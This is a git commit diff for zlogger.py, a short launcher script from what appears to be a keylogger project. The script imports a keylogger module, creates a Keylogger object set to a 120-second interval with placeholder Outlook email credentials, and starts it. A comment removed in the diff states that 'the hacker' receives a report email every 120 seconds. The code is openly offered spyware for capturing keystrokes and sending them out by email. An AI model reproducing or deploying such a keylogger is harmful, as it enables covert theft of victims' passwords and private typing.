fbeb12d4e51db3cf49167d2ecda3cfb491a8cddc
papineni saisharan <106763108+hxrarkey@users.noreply.github.com>
2024-04-29 15:04:38 +0530

    zlogger.py

--- zlogger.py
+++ zlogger.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 #importing the Keylogger file 
 import keylogger
-# time is set to 120 secs so for every 120 seconds the hacker recieves a new mail for the reports 
+# object creation 
 my_keylogger = keylogger.Keylogger(120, "enter your outlook mail id ", "enter your password")
+#starting the threading funcion
 my_keylogger.start()
